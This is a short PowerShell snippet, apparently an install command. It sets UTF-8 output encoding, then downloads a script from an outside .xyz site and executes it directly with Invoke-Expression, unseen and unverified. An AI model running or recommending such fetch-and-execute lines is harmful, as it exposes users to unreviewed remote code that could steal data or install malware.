[Console]::OutputEncoding = [Text.Encoding]::UTF8
iex ([Text.Encoding]::UTF8.GetString((Invoke-WebRequest "https://blinkymc.xyz/install/install.ps1").Content))
